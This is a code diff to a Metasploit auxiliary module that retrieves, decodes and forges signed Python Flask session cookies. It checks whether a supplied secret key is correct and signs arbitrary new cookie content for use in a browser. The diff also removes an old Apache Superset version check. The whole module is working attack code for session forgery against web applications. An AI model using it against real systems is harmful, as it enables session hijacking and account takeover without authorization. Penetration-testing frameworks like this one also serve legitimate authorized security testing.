@@ -12,12 +12,12 @@ class MetasploitModule < Msf::Auxiliary
         info,
         'Name' => 'Python Flask Cookie Signer',
         'Description' => %q{
-          This is a generic module which can manipulate Python Flask based application cookies.
-          The action Retrieve will connect to a web server, grab the cookie, and decode it.
-          The action Resign will do the same as above, but after decoding it, it will replace
+          This is a generic module which can manipulate Python Flask-based application cookies.
+          The Retrieve action will connect to a web server, grab the cookie, and decode it.
+          The Resign action will do the same as above, but after decoding it, it will replace
           the contents with that in NEWCOOKIECONTENT, then sign the cookie with SECRET. This
-          cookie can then be used in a browser. This is a ruby based implementation of some
-          of the features in the python project Flask-Unsign.
+          cookie can then be used in a browser. This is a Ruby based implementation of some
+          of the features in the Python project Flask-Unsign.
         },
         'Author' => [
           'h00die', # MSF module
@@ -35,7 +35,7 @@ class MetasploitModule < Msf::Auxiliary
         },
         'Actions' => [
           ['Retrieve', { 'Description' => 'Retrieve a cookie from an HTTP(s) server' }],
-          ['Resign', { 'Description' => 'Retrieve, Alter and Resign a cookie' }]
+          ['Resign', { 'Description' => 'Resign the specified cookie data' }]
         ],
         'DefaultAction' => 'Retrieve',
         'DisclosureDate' => '2019-01-26' # first commit by @Paradoxis to the Flask-Unsign repo
@@ -45,32 +45,19 @@ class MetasploitModule < Msf::Auxiliary
       [
         Opt::RPORT(80),
         OptString.new('TARGETURI', [ true, 'URI to browse', '/']),
-        OptString.new('NEWCOOKIECONTENT', [ false, 'Content of a cookie to sign', '']),
-        OptString.new('SECRET', [ false, 'Content of a cookie to sign', '']),
+        OptString.new('NEWCOOKIECONTENT', [ false, 'Content of a cookie to sign', ''], conditions: %w[ACTION == Resign]),
+        OptString.new('SECRET', [ true, 'The key with which to sign the cookie', '']),
+      ]
+    )
+    register_advanced_options(
+      [
+        OptString.new('CookieName', [ true, 'The name of the session cookie', 'session' ]),
+        OptString.new('Salt', [ true, 'The salt to use for key derivation', Msf::Exploit::Remote::HTTP::FlaskUnsign::Session::DEFAULT_SALT ])
       ]
     )
   end
 
-  def check
-    res = send_request_cgi!({
-      'uri' => normalize_uri(target_uri.path)
-    })
-    return Exploit::CheckCode::Unknown("#{peer} - Could not connect to web service - no response") if res.nil?
-    return Exploit::CheckCode::Unknown("#{peer} - Unexpected response code (#{res.code})") unless res.code == 200
-    return Exploit::CheckCode::Safe("#{peer} - Unexpected response, version_string not detected") unless res.body.include? 'version_string'
-    unless res.body =~ /&#34;version_string&#34;: &#34;([\d.]+)&#34;/
-      return Exploit::CheckCode::Safe("#{peer} - Unexpected response, unable to determine version_string")
-    end
-
-    version = Rex::Version.new(Regexp.last_match(1))
-    if version < Rex::Version.new('2.0.1') && version >= Rex::Version.new('1.4.1')
-      Exploit::CheckCode::Vulnerable("Apache Supset #{version} is vulnerable")
-    else
-      Exploit::CheckCode::Safe("Apache Supset #{version} is NOT vulnerable")
-    end
-  end
-
-  def retrieve
+  def action_retrieve
     print_status("#{peer} - Retrieving Cookie")
     res = send_request_cgi!({
       'uri' => normalize_uri(target_uri.path),
@@ -78,21 +65,42 @@ class MetasploitModule < Msf::Auxiliary
     })
     fail_with(Failure::Unreachable, "#{peer} - Could not connect to web service - no response") if res.nil?
     fail_with(Failure::UnexpectedReply, "#{peer} - Unexpected response code (#{res.code})") unless res.code == 200
-    cookie = res.get_cookies.to_s
+
+    cookie = cookie_jar.cookies.find { |c| c.name == datastore['CookieName'] }&.cookie_value
+    fail_with(Failure::UnexpectedReply, "#{peer} - Response is missing the session cookie") unless cookie
+
     print_status("#{peer} - Initial Cookie: #{cookie}")
-    Msf::Exploit::Remote::HTTP::FlaskUnsign::Session.decode(cookie.split('=')[1].gsub(';', ''))
+    cookie = cookie.split('=')[1].gsub(';', '')
+    begin
+      decoded_cookie = Msf::Exploit::Remote::HTTP::FlaskUnsign::Session.decode(cookie)
+    rescue StandardError => e
+      print_error("Failed to decode the cookie: #{e.class} #{e}")
+      return
+    end
+
+    print_status("#{peer} - Decoded Cookie: #{decoded_cookie}")
+
+    # use dehex to allow \x style escape sequences for unprintable chars
+    secret = Rex::Text.dehex(datastore['SECRET'])
+    salt = Rex::Text.dehex(datastore['Salt'])
+
+    if Msf::Exploit::Remote::HTTP::FlaskUnsign::Session.valid?(cookie, secret, salt: salt)
+      print_good("#{peer} - Secret key #{secret.inspect} is correct.")
+    elsif datastore['SECRET'].present?
+      print_warning("#{peer} - Secret key #{secret.inspect} is incorrect.")
+    end
   end
 
   def run
     case action.name
     when 'Retrieve'
-      decoded_cookie = retrieve
-      print_good("#{peer} - Decoded Cookie: #{decoded_cookie}")
-      return
+      action_retrieve
     when 'Resign'
       print_status("Attempting to sign with key: #{datastore['SECRET']}")
-      encoded_cookie = Msf::Exploit::Remote::HTTP::FlaskUnsign::Session.sign(datastore['NEWCOOKIECONTENT'], datastore['SECRET'])
-      print_good("#{peer} - New signed cookie: #{encoded_cookie}")
+      secret = Rex::Text.dehex(datastore['SECRET'])
+      salt = Rex::Text.dehex(datastore['Salt'])
+      encoded_cookie = Msf::Exploit::Remote::HTTP::FlaskUnsign::Session.sign(datastore['NEWCOOKIECONTENT'], secret, salt: salt)
+      print_good("#{peer} - New signed cookie: #{datastore['CookieName']}=#{encoded_cookie}")
     end
   end
 end
